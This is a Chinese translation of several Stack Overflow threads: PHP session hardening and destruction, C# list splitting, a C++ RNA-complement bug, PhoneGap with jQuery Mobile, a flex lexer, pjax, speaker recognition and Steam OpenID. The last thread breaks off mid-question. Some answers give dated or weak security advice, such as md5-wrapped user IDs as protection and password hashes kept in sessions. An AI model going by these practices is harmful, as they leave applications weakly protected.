首先，您应该阅读[Mozilla WebAppSec 安全编码指南 - 会话管理](https://wiki.mozilla.org/WebAppSec/Secure_Coding_Guidelines#Session_Management)和[OWASP A3-Broken Authentication and Session Management](https://www.owasp.org/index.php/Top_10_2010-A3)。您可以[配置 PHP 的会话处理程序](http://php.net/manual/en/session.configuration.php)来满足这些要求。

您应该防止的第一个缺陷是[A9-Insufficient Transport Layer Protection](https://www.owasp.org/index.php/Top_10_2010-A9-Insufficient_Transport_Layer_Protection)。简而言之，您不希望有人使用[Firesheep 之类的工具](http://en.wikipedia.org/wiki/Firesheep)劫持会话。可以通过强制浏览器仅通过 https 发送会话 id 来防止这种攻击：

```
session.cookie_secure=1 
```

[您可以通过设置httponly 标志](https://www.owasp.org/index.php/HttpOnly)来防止攻击者使用 XSS 获取会话 ID ：

```
session.cookie_httponly=1 
```

您**总是**希望使用 cookie 来存储您的会话 ID。如果会话 ID 可以使用 GET 或 POST 变量传递，那么攻击者可以使用[会话固定攻击](https://www.owasp.org/index.php/Session_fixation)来劫持会话。考虑这种攻击的另一种方式是，您不希望攻击者为另一个用户创建会话：

```
session.use_cookies=1
session.use_only_cookies=1 
```

接下来，您要确保从 CSPRNG 中获得至少 128 位的熵。在 *nix 系统下，您可以使用`/dev/urandom`：

```
session.entropy_file="/dev/urandom"
session.entropy_length=16 
```

会话处理程序不是一切。您仍然需要担心[跨站点请求伪造攻击](http://en.wikipedia.org/wiki/Cross-site_request_forgery)（又名 CSRF 或“会话骑行”）和跨站点脚本 (XSS)。XSS 可用于破坏 CSRF 保护（即使使用 http_only cookie！）。 攻击者也可以使用点击劫持来执行未经授权的操作 [。](http://en.wikipedia.org/wiki/Clickjacking)

设置这些配置选项后，只需调用`session_start()`. 至于`session_destroy()`在用户注销时销毁会话调用，就这么简单！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T22:19:29.910

为了安全地销毁会话，我将使用以下代码：

```
session_start();
// Unset all session values
$_SESSION = array();
// get session parameters 
$params = session_get_cookie_params();
// Delete the actual cookie.
setcookie(session_name(), '', time() - 42000, $params["path"], $params["domain"], $params["secure"], $params["httponly"]);
// Destroy session
session_destroy(); 
```

为了销毁会话，您需要先启动它，因为您发现如果不包含 session_start(); 它就不起作用；

session_regenerate_id(); 函数为用户生成一个新的会话 ID。如果与 true (session_regenerate_id(true);) 一起使用，则在生成新会话 ID 时，旧会话 ID 将从服务器中删除。在每个页面上生成新会话 ID 的原因是，由于用户不断更改会话 ID，它使会话劫持更​​难（几乎不可能？）执行。

[（在session_regenerate_id();](http://www.php.net/manual/en/function.session-regenerate-id.php)上查看 PHP.net 手册）

在对用户进行身份验证时，您应该始终检查 IP 地址或浏览器之类的内容，这些是在请求中发送到服务器的持续内容，在会话的生命周期内不会改变，如果他们这样做了，那么您就知道它正在发生一些狡猾的事情. 我总是创建两个会话变量，一个存储用户 ID，以便我可以查询数据库中的数据，另一个将用户密码、IP 地址和浏览器字符串存储在一个哈希 (sha512) 中。

```
$user_id = $_SESSION['user_id'];
$login_string = $_SESSION['login_string'];

// Query Database and get hashed password

$login_check = hash('sha512', $password.$ip_address.$user_browser);

if($login_check == $login_string) {
     // Logged In!!!!
     return true;
} else {
     // Not logged in
     return false;
} 
```

密码是安全的，即使它存储在会话中。这是因为密码被散列（在这种情况下是两次），并且因为会话数据没有存储在用户计算机上（如 cookie），它存储在会话文件中。

我在 wikihow.com 上写了一篇关于安全登录和身份验证的文章，可以在[这里](http://www.wikihow.com/Create-a-Secure-Login-Script-in-PHP-and-MySQL)找到。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T11:25:26.240

你可以写：

```
session_start(); // session should be started before it can be used. 
```

您可以分配登录成员的用户 ID。为此，您可以从用户输入中获取用户名和密码，并在您的数据库中检查并返回用户 ID。为了提高安全性，您可以使用字符串，例如。“演示”和“测试”都只是 md5，并以下列方式将其与用户 ID 混合。

```
$userid=md5("demo").$userid.md5("test");// you can set any string instead of demo and test.

$_SESSION['userid']=$userid; 
```

在其他页面使用时，

```
session_start(); // If you are have not started it or included above code file in it. 
```

正如您在使用时知道的字符串，只需匹配它并从中找到确切的用户 ID 并在您的代码中使用它。

要销毁它，只需使用：

```
session_unset($_SESSION['userid']); // It will only unset the session userid completely. 
```

确保在使用任何会话之前您需要启动它。以更好的方式，您可以在一个文件中启动会话，例如 init.php 并将其包含在您要使用会话的每个位置

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-25T08:59:42.480

您可以先使用`session_id()`来确定用户是否已经获得了会话，如果没有，则使用`session_start()`.

来自 Lithium 框架的示例代码：

```
/**
 * Starts the session.
 *
 * @return boolean True if session successfully started (or has already been started),
 *         false otherwise.
 */
protected static function _start() {
    if (session_id()) {
        return true;
    }
    ...
    return session_start();
} 
```

通话后`_start()`，您可以放心通话`session_destroy()`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-25T13:08:56.153

要在不使用“start_session()”的情况下销毁会话，首先验证是否存在不如下所示的活动会话

```
$existingSessionId = session_id();
if ($existingSessionId != "")
{
     // Initialize the session.
     session_start();

     // Unset all of the session variables.
     $_SESSION = array();

     // If it's desired to kill the session, also delete the session cookie.
     // Note: This will destroy the session, and not just the session data!
     if (ini_get("session.use_cookies")) {
         $params = session_get_cookie_params();
         setcookie(session_name(), '', time() - 42000,
             $params["path"], $params["domain"],
             $params["secure"], $params["httponly"]
         );
     }

     // Finally, destroy the session.
     session_destroy();
}
else
{
     // No Active sessions
} 
```

session_regenerate_id(true)，只是用新的会话ID替换旧的会话ID，但它不会取消设置旧的会话ID。session_destroy 和删除会话 cookie 需要注意这一点。

一旦会话被破坏，浏览器就会向服务器发送会话 cookie。PHP 将获取此会话 ID，当您执行 start_session() 时，它将使用浏览器发送的会话 ID。如果您删除会话 cookie，session_start 将生成一个新的会话 id，您无需调用 session_regenerate_id()

# c# - 分隔列表的更快方法

> ID：15510098
> 
> 赞同：1
> 
> 时间：2013-03-19T20:46:19.123
> 
> 标签：c#, performance, list

我有两节课。

```
class Vehicle{
    public string VehicleId {get;set;}
    public string VinNo {get;set;}
    public int ModelYear {get;set;}
    public string Make {get;set;}
    public bool WaterDamaged {get;set;}
    }

class Vins{
    public string VinNo {get;set;}
} 
```

我使用此类结构从数据库中填充了车辆列表。所以代码看起来有点像这样。

```
List<Vehicle> vehicles = GetAllVehicles(); 
```

我拥有的另一个列表来自一个文件。此列表包含所有被水损坏的 VIN。我能够为这个类使用与上面相同的结构。

```
List<Vins> damaged = ReadFile();

List<Vehicles> damagedGoods = new List <Vehicles>();
List<Vehicles> goodGoods = new List <Vehicles>(); 
```

我需要使用此信息创建两个单独的 XML 文件。第一个将被称为 DamagedVehicles_{date}，下一个将是 GoodVehicles_{date}。

所以我所做的就是写一个这样的循环。

```
foreach(var v in damaged)
{
    foreach(var v2 in vehicles)
    {
        if(v.VinNo == v2.VinNo) 
        {
            damagedGoods.Add(new Vehicle{});
        }
        else
        {
            goodGoods.Add(new Vehicle{});
        }
    }
} 
```

这导致了一个小问题。首先，goodGoods 得到了重复，后来我把它们淘汰了。其次，如果我收到一份 80,000 辆汽车的清单，这需要很长时间才能处理。有什么方法可以加快处理速度并避免重复吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-19T20:52:29.930

您的嵌套`foreach`正在执行两个列表的叉积。那是……不是你想要的。这不仅是一项固有的昂贵操作，而且它的结果根本不符合您的要求。

你想要做的是这样的：

```
foreach(var vehicle in vehicles)
{
    if(damaged.Contains(vehicle.VinN) 
    {
        damagedGoods.Add(new Vehicle{});
    }
    else
    {
        goodGoods.Add(new Vehicle{});
    }
} 
```

（请注意，外部循环已完全移除。）

`List`由于在搜索方面不是特别有效的事实，这可以进一步改进。如果我们使用 a`HashSet`来固定损坏的车辆，速度`Contains`会*快得多*。这很容易做到：

```
HashSet<Vins> damaged = new HashSet<Vins>(ReadFile()); 
```

# c++ - 输出字符串/字符的错误 (C++)

> ID：15510099
> 
> 赞同：0
> 
> 时间：2013-03-19T20:46:25.680
> 
> 标签：c++

我创建了一个名为 RNA_complement 的函数。它应该采用已经从输入文件流中读取的一行并将特定字母替换为新字母（因此称为补码）。完成后，它应该将结果输出到输出文件流（输出文件）。

问题是：它没有将结果输出到文件中，即使我已经为它编写了一个命令。为什么不通过？

该函数是在 int main 函数之外编写的，并且该函数在 main 函数中声明和初始化。

我遇到了其他错误，例如“从 char* 到 char 的无效转换”和“无法将字符串转换为 char”等。这令人沮丧

这是代码：

```
char RNA_complement(string line)
{
char mychar[50];
ofstream genesacidnew;

  for (int i = 0; i < line.length(); i++)
  {
    line = mychar[i];
        if (mychar[i] == 'A')
        {
            mychar[i]= 'Z';

        }
    genesacidnew << "Complement: " <<mychar <<endl;
}

} 
```

然后我决定在这里初始化函数

```
genesacid.open("genes.txt");
    if(!genesacid.is_open())
    {
        cerr <<"Error: File cannot be opened"<<endl;
        return -1;
    }
        else
        {
            getline(genesacid, line1);

        }

genesacid.close();

genesacidnew.open("genesoutput.txt");
    if(!genesacidnew.is_open())
    {
        cerr <<"Error: File cannot be opened"<<endl;
        return -1;
    }
        else
        {
            genesacidnew<<"Fragment 1: " <<line1 <<endl;
            genesacidnew<<"Complement: "<<endl;
        }

RNA_complement(line1); /*here*/

genesacidnew.close(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:01:43.553

首先，让我们弄清楚什么是 RNA 互补：它包括用互补碱基代码替换 RNA 碱基的字母，即`A`↔`U`和`C`↔ `G`（我在这里忽略了 IUPAC 歧义代码，因为它们很少使用）。

其次，让我们指定函数的范围。目前它（不成功）尝试做两件事：

1.  更改字符串本身，然后
2.  将更改的碱基写入文件。

它还返回一些东西 ( `char`) 但不清楚是什么。

让我们从头开始并正确指定语义：

*   该函数`rna_complement`（注意 C++ 命名约定）将 RNA 片段作为 a `std::string`（全部大写）并返回片段的补充版本。

这是直截了当和明确的。**现在**我们可以实现它：

```
std::string rna_complement(std::string fragment) {
    for (unsigned pos = 0; pos < fragment.length(); ++pos) {
        switch (fragment[pos]) {
            case 'A': fragment[pos] = 'U'; break;
            case 'C': fragment[pos] = 'G'; break;
            case 'G': fragment[pos] = 'C'; break;
            case 'U': fragment[pos] = 'A'; break;
            default: assert(false); // This should never happen.
        }
    }

    return fragment;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T20:49:04.333

在您的`RNA_complement`函数中，您写道：

```
ofstream genesacidnew; 
```

您从未指定要写入哪个文件。像这样使用

```
ofstream genesacidnew("Myfilename.ext"); 
```

# android - jQuery Mobile 不适用于 PhoneGap

> ID：15510100
> 
> 赞同：2
> 
> 时间：2013-03-19T20:46:27.427
> 
> 标签：android, html, jquery-mobile, cordova

我正在开发一个[PhoneGap](http://en.wikipedia.org/wiki/PhoneGap)应用程序并且正在使用[jQuery Mobile](http://en.wikipedia.org/wiki/JQuery_Mobile)。上次我在做这个项目时，它看起来很棒，但现在 jQuery Mobile 停止了工作。这是怎么回事？

这是我的代码：

```
<!DOCTYPE html>
<html>
    <head>
        <link rel="stylesheet" href="http://code.jquery.com/mobile/1.0a3/jquery.mobile-1.0a3.min.css" />
        <script type="text/javascript" src="http://code.jquery.com/jquery-1.5.min.js"></script>
        <script type="text/javascript" src="http://code.jquery.com/mobile/1.0a3/jquery.mobile-1.0a3.min.js"></script>
    </head>

    <body>
        <div id="page" data-role="page" data-theme="b">
            <div data-role="content">
            <h2>Login To Carpool Mobile</h2>
            <p align="right"><a href="registration.html" id="showregistration">Don't have an account? &rarr;</a></p>
                <form method="post" id="loginForm">

                    <label for="password">Email:</label>
                    <input class="required" type="text" name="username" id="username" placeholder="username@target.com">

                    <label for="password">Password:</label>
                    <input class="required" type="password" name="password" id="password" placeholder="password">

                    <input type="button" value="Login" id="submitButton" onClick="handleLogin()">
                </form>
            </div>
        </div>

        <script>
        $(document).ready(function() {
            checkPreAuth();
        });
        </script>
    </body>
</html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-27T20:58:35.460

PhoneGap 要求您在根目录的“config.xml”文件中手动设置/允许应用程序的各个方面。

我相信您正在寻找的解决方案是这一行：

```
<access origin="http://code.jquery.com" subdomains="true" /> 
```

您允许访问“ [http://code.jquery.com](http://code.jquery.com) ”的外部资源并允许其所有子域。这意味着您刚刚解锁了 jquery mobile，这就是您想要的，如您的脚本标签所示：

> ```
> <script type="text/javascript" src="http://code.jquery.com/jquery-1.5.min.js"></script>
> <script type="text/javascript" src="http://code.jquery.com/mobile/1.0a3/jquery.mobile-1.0a3.min.js"></script> 
> ```
> 
> 这些“src”属性现在被视为您刚刚成功允许的[http://code.jquery.com的“子域”！](http://code.jquery.com)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T03:54:46.077

您不能在 jQuery Mobile 中使用以下一项

```
$(document).ready(function() {
    checkPreAuth();
}); 
```

您需要使用自定义的 jQuery Mobile 特定事件。您可能需要更改您的代码，如下所示。

```
$('#page').live('pageshow', function(event){
    checkPreAuth();             
}); 
```

检查文档以获取[更多相关事件](http://api.jquerymobile.com/category/events/)。

从您的代码中，我可以注意到您正在使用非常古老的 jQuery 和 jQuery Mobile 库。我建议您升级到最新的[库](http://jquerymobile.com/download/)，这将使您能够使用比当前版本更多的功能。

这是来自 jsfiddle的[最新框架的示例。](http://jsfiddle.net/AKn6S/1/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-12-10T15:12:36.800

`checkPreAuth();`除了未定义的代码之外，我对您的代码没有任何问题。您还应该尝试更新您的查询和 jquery mobile 版本。我建议您下载并包含应该在您的**www**项目目录中包含 JQuery 移动和 Jquery 文件（脚本文件）

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-03-19T21:11:01.250

删除`$(document).ready(function()`并保留`checkPreAuth();`在 PhoneGap 的 deviceready 事件中。

# token - 我的 flex 文件的输出错误

> ID：15510101
> 
> 赞同：0
> 
> 时间：2013-03-19T20:46:34.713
> 
> 标签：token, bison, flex-lexer

我已经编写了一个 .l 文件并希望在“c17.isc”中输出内容。

但是有一个错误我不知道为什么。我已经给出了我打算阅读的文件、flex 文件和执行结果。

这是c17.isc文件内容的意思

```
number  gate_name  gate_type  output_number  input_number  fault 
```

带有“from”的行表示扇出。有 2 个数字的行仅表示输入列表。

```
*c17 iscas example (to test conversion program only)
*---------------------------------------------------
*
*
*  total number of lines in the netlist ..............    17
*  simplistically reduced equivalent fault set size =     22
*        lines from primary input  gates .......     5
*        lines from primary output gates .......     2
*        lines from interior gate outputs ......     4
*        lines from **     3 ** fanout stems ...     6
*
*        avg_fanin  =  2.00,     max_fanin  =  2
*        avg_fanout =  2.00,     max_fanout =  2
*
* 
*
*
*
    1     1gat inpt    1   0      >sa1
    2     2gat inpt    1   0      >sa1
    3     3gat inpt    2   0 >sa0 >sa1
    8     8fan from     3gat      >sa1
    9     9fan from     3gat      >sa1
    6     6gat inpt    1   0      >sa1
    7     7gat inpt    1   0      >sa1
   10    10gat nand    1   2      >sa1
     1     8
   11    11gat nand    2   2 >sa0 >sa1
     9     6
   14    14fan from    11gat      >sa1
   15    15fan from    11gat      >sa1
   16    16gat nand    2   2 >sa0 >sa1
     2    14
   20    20fan from    16gat      >sa1
   21    21fan from    16gat      >sa1
   19    19gat nand    1   2      >sa1
    15     7
   22    22gat nand    0   2 >sa0 >sa1
    10    20
   23    23gat nand    0   2 >sa0 >sa1
    21    19 
```

这是我写的 flex 文件。

首先，这是声明文件：

```
# include <stdio.h>
# include <string.h>
# include <stdlib.h>

# define INPT 1
# define NOR 2
# define NAND 3
# define NOT 4
# define XOR 5
# define AND 6
# define BUFF 7
# define FROM 8 
```

其次，这是 flex 文件：

```
%{
# include "declare.h"

/*gi=1,it's input;gi=7,it's fanout;otherwise,it's gate*/
int gi=-1;
int inum=0;
int val;

struct{
    char *symbol;
    int val;
} symtab[]={
"inpt", INPT,
"nor", NOR,
"nand", NAND,
"not", NOT,
"xor", XOR,
"and", AND,
"buff", BUFF,
"from",FROM,
"0",0
};

extern FILE *yyin;
%}

%start A B C D E

DIGITS [0-9]+
BLANK [ \t\n]+
ALPHA [a-z]+

%%

"*".*\n     {ECHO; BEGIN A;}

<A>{BLANK}{DIGITS} {printf("num=%s\t",yytext); BEGIN B;}
<B>{BLANK}{DIGITS}{ALPHA} {printf("name=%s",yytext); BEGIN C;}
<C>{BLANK}{DIGITS} {printf("op=%s\t",yytext);BEGIN D;}
<C>{BLANK}{DIGITS}{ALPHA} {ECHO; BEGIN A;}
<D>{BLANK}{DIGITS} {inum=atoi(yytext);
                    printf("ip=%s\t",yytext);
                    if(gi==1)
                    {BEGIN A;}
                    if(gi!=1)
                    {BEGIN E;}
                   }

<E>{BLANK}{DIGITS} {inum--;
                    if(inum<0)
                    {printf("num=%s\t",yytext); BEGIN B;}
                    else
                    {printf("il=%s\t",yytext); BEGIN E;} 
                   }

{ALPHA} {gi=lookup(yytext);
         if(gi!=0) printf("\tty=%d\t",gi);
         else ECHO;

         }

{BLANK}">sa"[0-1] {val=atoi(&yytext[yyleng-1]);printf("\tfl=%d",val);}

{BLANK}    ;

%%
lookup(s)
char* s;
{int i;
for (i=0;symtab[i].val!=0;i++)
{
if(strcmp(symtab[i].symbol,s)==0)
break;
}
return(symtab[i].val);
}

main()
{
FILE *x=fopen("c17.isc","r");
yyin=x;
yylex();
} 
```

这是执行结果。我用 * 标记了错误的地方。基本上错误发生在输入列表的行。

例如，图片中第一个错行应该是“ `num=10`”，第二个错行应该是“ `il=1 il=8`”等。

我对 flex 文件中输入列表的操作位于 E 部分。但我不知道为什么它不起作用。

```
num=1  name=1gat  ty=1  op=1  ip=0  fl=1
num=2  name=2gat  ty=1  op=1  ip=0  fl=1
num=3  name=3gat  ty=1  op=2  ip=0  fl=0  fl=1
num=8  name=8fan  ty=8  3gat  fl=1
num=9  name=9fan  ty=8  3gat  fl=1
num=6  name=6gat  ty=1  op=1  ip=0  fl=1
num=7  name=7gat  ty=1  op=1  ip=0  fl=1
**il=10**  name=10gat  ty=3  op=1  ip=2  fl=1
**num=1**  il=8
**il=11**  name=11gat  ty=3  op=2  ip=2  fl=0  fl=1
**num=9**  il=6
**num=4**  ...
**num=5**  ...
**il=16**  ...
**num=2**  il=14
**num=0**  ...
**num=1**  ...
**il=19**  ...
**num=15** il=7
**il=22**  ...
**il=23**  ... 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T09:52:44.887

您的代码的这种改编似乎可以按您的预期工作。有各种变化，最显着的是输出一些换行符，并明确`num=`识别部分的位置。

```
%{
#include "declare.h"

/*gi=1, it's input;gi=7, it's fanout;otherwise, it's gate*/
static int gi = -1;
static int inum = 0;

extern int lookup(const char *s);

struct
{
    char *symbol;
    int val;
} symtab[]=
{
    {   "inpt", INPT },
    {   "nor",  NOR  },
    {   "nand", NAND },
    {   "not",  NOT  },
    {   "xor",  XOR  },
    {   "and",  AND  },
    {   "buff", BUFF },
    {   "from", FROM },
    {   "0",    0    },
};

extern FILE *yyin;
%}

%start A B C D E

DIGITS [0-9]+
BLANK [ \t\n]+
ALPHA [a-z]+

%%

"*".*\n              {ECHO; BEGIN A;}

<A>{DIGITS}          {printf("\nnum1=%s\t", yytext); BEGIN B;}
<B>{DIGITS}{ALPHA}   {printf(" name=%s\t",  yytext); BEGIN C;}
<C>{DIGITS}          {printf(" op=%s\t",    yytext); BEGIN D;}
<C>{DIGITS}{ALPHA}   {ECHO; BEGIN A;}
<D>{DIGITS}          {
                     inum=atoi(yytext);
                     printf(" ip=%s\t", yytext);
                     if (gi==1)
                     {BEGIN A;}
                     if (gi!=1)
                     {BEGIN E;}
                     }

<E>{DIGITS}          {inum--;
                     if (inum<0)
                     {printf("\nnum2=%s\t", yytext); BEGIN B;}
                     else
                     {printf(" il=%s\t", yytext); BEGIN E;} 
                     }

{ALPHA}              {
                     gi = lookup(yytext);
                     if (gi!=0) printf(" ty=%d (%s)\t", gi, yytext);
                     else { printf("Lookup failed: "); ECHO; }
                     }

">sa"[0-1]           {int val=atoi(&yytext[yyleng-1]);printf(" fl=%d", val);}

{BLANK}              ;
.                    { printf("Unmatched: %s\n", yytext); }

%%
int lookup(const char *s)
{
    int i;
    for (i = 0; symtab[i].val != 0; i++)
    {
        if (strcmp(symtab[i].symbol, s) == 0)
            break;
    }
    return(symtab[i].val);
}

int main(void)
{
    FILE *x=fopen("c17.isc", "r");
    yyin=x;
    yylex();
    putchar('\n');
} 
```

对于您的示例输入，输出为：

```
*c17 iscas example (to test conversion program only)
*---------------------------------------------------
*
*
*  total number of lines in the netlist ..............    17
*  simplistically reduced equivalent fault set size =     22
*        lines from primary input  gates .......     5
*        lines from primary output gates .......     2
*        lines from interior gate outputs ......     4
*        lines from **     3 ** fanout stems ...     6
*
*        avg_fanin  =  2.00,     max_fanin  =  2
*        avg_fanout =  2.00,     max_fanout =  2
*
* 
*
*
*

num1=1   name=1gat   ty=1 (inpt)     op=1    ip=0    fl=1
num1=2   name=2gat   ty=1 (inpt)     op=1    ip=0    fl=1
num1=3   name=3gat   ty=1 (inpt)     op=2    ip=0    fl=0 fl=1
num1=8   name=8fan   ty=8 (from)    3gat fl=1
num1=9   name=9fan   ty=8 (from)    3gat fl=1
num1=6   name=6gat   ty=1 (inpt)     op=1    ip=0    fl=1
num1=7   name=7gat   ty=1 (inpt)     op=1    ip=0    fl=1
num1=10  name=10gat  ty=3 (nand)     op=1    ip=2    fl=1 il=1   il=8   
num2=11  name=11gat  ty=3 (nand)     op=2    ip=2    fl=0 fl=1 il=9  il=6   
num2=14  name=14fan  ty=8 (from)    11gat fl=1
num1=15  name=15fan  ty=8 (from)    11gat fl=1
num1=16  name=16gat  ty=3 (nand)     op=2    ip=2    fl=0 fl=1 il=2  il=14  
num2=20  name=20fan  ty=8 (from)    16gat fl=1
num1=21  name=21fan  ty=8 (from)    16gat fl=1
num1=19  name=19gat  ty=3 (nand)     op=1    ip=2    fl=1 il=15  il=7   
num2=22  name=22gat  ty=3 (nand)     op=0    ip=2    fl=0 fl=1 il=10     il=20  
num2=23  name=23gat  ty=3 (nand)     op=0    ip=2    fl=0 fl=1 il=21     il=19 
```

与`num1=10`has`il=1`并`il=8`与之关联的行，似乎反映了数据。（我修改了打印输出以包括类型名称和类型编号。）

我不确定哪些变化是重要的。我认为，丢失`{BLANK}`匹配数字和字母的部分规则可以简化事情（扫描仪基本上忽略间距是很常见的）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T08:35:36.077

我不确定我是否正确理解了您的情况，但看起来您正在使用 Flex 和正则表达式解析文件的所有工作？

通常的方法是使用 Flex 生成仅识别令牌的扫描仪（函数 yylex）。令牌可以是单个数字或门名称。扫描器在找到令牌后立即返回。因此扫描器将输入（文件中的字符序列）转换为标记序列。

然后，您使用解析器生成器（通常是 Bison）来生成解析器，它将这些单个标记与语法进行比较，然后在解析器级别处理您输入的更大结构。

当您尝试在 Flex 中完成这一切时，它会变得非常复杂，这并不适合它。

# heroku - Bonsai ElasticSearch 中的 IP 地址限制作为 Heroku 插件

> ID：15510103
> 
> 赞同：1
> 
> 时间：2013-03-19T20:46:36.380
> 
> 标签：heroku, elasticsearch

我已经开始使用 Heroku 的 ElasticSearch 插件，Bonsai。我想在我的网站上为多个类别创建一个后端搜索。由于这是一个仅限后端的服务，并且可能包含敏感信息，我如何将连接到 Heroku 提供给我的 Bonsai 服务器的 IP 地址限制为我的 Web 服务器的 IP 地址/范围。

请注意，我的 Web 服务器在私有硬件上运行，而不是托管在云服务上。我也没有在 Heroku 上使用任何其他 Web 服务，所以我不想使用 Ruby 来回答这个问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2016-02-13T16:21:02.840

我最终与 Bonsai 团队合作，在他们端设置了一个自定义解决方案，该解决方案需要用户名和密码组合才能访问我托管搜索中的任何数据。

# javascript - pjax 片段问题

> ID：15510106
> 
> 赞同：0
> 
> 时间：2013-03-19T20:46:43.950
> 
> 标签：javascript, jquery, ajax, html, pjax

我正在尝试使用 pjax 的片段选项来仅刷新页面的一部分。单击时没有任何反应，也没有抛出任何错误，只有硬页面重新加载。没有进行 ajax 调用。用铬测试

```
<!DOCTYPE html>
<html>

  <head>
    <title>PJAX TEST</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
    <link href="/css/reset.css" rel="stylesheet" media="all">
    <link href="/css/index-style.css" rel="stylesheet" media="all">

    <script src="http://code.jquery.com/jquery.js"></script>
    <script src="/jquery.pjax.js"></script>
    <script src="/script.js"></script>
  </head>

  <body>

    <div class="wrapper">
        <div class="header">
          <ul id="navlist">
            <li><a href="/index.html">click</a></li>
            <li><a href="/one/index.html">click 1</a></li>
            <li><a href="/two/index.html">click 2</a></li>
            <li><a href="/three/index.html">click 2</a></li>
          </ul>
        </div>

        <div id="container">

          <div id="inner-content">

            <h1>YEA YEA - INDEX PAGE</h1>
            <div id="text-block">Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.

            </div>
          </div>

        </div>

        <div class="footer">
            <h3>Sticky footer</h3>
        </div>
    </div>

  </body>
</html> 
```

而 script.js 是

```
$(function(){

    $('li a').pjax("#container", { fragment: "#container" });

}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T14:04:38.490

不得不添加

```
<div id="container" data-pjax-container> 
```

到容器和

```
$(document).pjax('a', '[data-pjax-container]', { fragment: "#container" }); 
```

到 JS

# c# - 如何检测谁在说话

> ID：15510109
> 
> 赞同：2
> 
> 时间：2013-03-19T20:46:47.763
> 
> 标签：c#, speech-recognition, voice-recognition, sapi

我正在为我们的工作场所开发一个项目，以操纵我们的环境，如灯光、咖啡机、打印机等，我不知道如何检测谁在与我们的系统说话。

我正在使用`Speech.Recognition`库使用 C# 构建项目。

到目前为止，我已经设法捕获命令并执行简单的事情，但我想更进一步并检测到这个人，所以如果一个人例如“John”正在说话，那么当他说“Hi system”时，系统会记录说话的人回答“嗨，约翰！” 之后它只识别“约翰”的语音命令并忽略不同的声音。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-19T22:04:38.893

你想要做的就是所谓`Voice Biometrics`的，这是一个难题，由 Nuance 等公司解决（[http://www.nuance.com/for-business/by-solution/customer-service-solutions/solutions-services/inbound-解决方案/语音-身份验证-生物识别/index.htm](http://www.nuance.com/for-business/by-solution/customer-service-solutions/solutions-services/inbound-solutions/voice-authentication-biometrics/index.htm)）。我确信有开源/研究解决方案。

一个好的项目（Java）例如：http: [//sourceforge.net/projects/marf/](http://sourceforge.net/projects/marf/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-06-09T07:55:41.913

您要求进行语音识别或语音验证，这是语音分析的众多用途之一。请注意，**语音识别远非完美**。

您首先需要训练数据和算法，从中为您的演讲者推导出统计模型。稍后，在识别/验证阶段，您将尝试根据您的统计模型拟合输入数据并确定阈值，该阈值决定说话者是否已知。如果您想自己实现它或只是寻找更多技术信息，一些关键字是**梅尔频率倒谱系数、高斯混合模型和隐马尔可夫模型**。

一个有趣的工具可能是**[Praat](http://www.fon.hum.uva.nl/praat/)**。它不能直接作为库使用，但 ICSI 的人们编写了一个名为[praatlib](http://www.icsi.berkeley.edu/icsi/groups/speech/software)的包装器。它提取语音特征，例如**共振峰频率、音高等**。ICSI 使用它来区分录音中的说话者（这称为 diarization）。

有相当多的免费工具可用，但都需要深入了解统计、语音分析和大量时间才能理解通常记录不足的学术代码。您应该看看的一些有趣的项目是**[Sphinx](http://cmusphinx.sourceforge.net/) (Java) 和[SHoUT](http://shout-toolkit.sourceforge.net/) (C++)**。Sphinx 有很好的文档，如果您发现自己对理论细节提出质疑，可以阅读 SHoUT 的论文。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-19T20:51:20.263

您需要使每个用户都独一无二。

您可以通过拥有一个用户池并使用您的识别库来做到这一点......将他们独特的语音属性（音高，电平等）存储到所述池中，然后让您的软件识别这些属性并相应地执行。

# php - 是否可以在不使用 OpenID 的情况下进行 Steam 身份验证？

> ID：15510110
> 
> 赞同：-1
> 
> 时间：2013-03-19T20:46:49.047
> 
> 标签：php, authentication, steam

我想知道是否可以在不使用 openID 的情况下在 PHP 中创建身份验证系统？我在谷歌上做了一些搜索，但他们都以某种方式使用了 openID。那么，是否有可能没有 openID，或者 openID 是否有一些私有 api 可以蒸汽？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T20:53:00.180

如果您尝试插入 Steam，那么据我所知，OpenID 是您唯一的选择。如果您在针对 OpenID 进行身份验证时遇到问题，可以尝试以下 PHP 库之一：http: [//openid.net/developers/libraries/#php](http://openid.net/developers/libraries/#php)

# javascript - Javascript replace() 函数添加奇怪的字符

> ID：15510111
> 
> 赞同：0
> 
> 时间：2013-03-19T20:46:59.470
> 
> 标签：javascript, jquery, replace, fancybox, character

考虑以下 Javascript：

```
var previewImg = 'http://example.com/preview_img/hey.jpg';
var fullImg = previewImg.replace('preview','full'); 
```

我希望的价值`fullImg`是：

```
http://example.com/full_img/hey.jpg 
```

事实上，它是……有点。运行`alert(fullImg);`显示预期的 url 字符串。但是当我将该变量传递给 jQuery [Fancybox](http://fancybox.net/)时，如下所示：

```
jQuery.fancybox.open(fullImg); 
```

有些东西会在字符串中添加字符，如下所示：

```
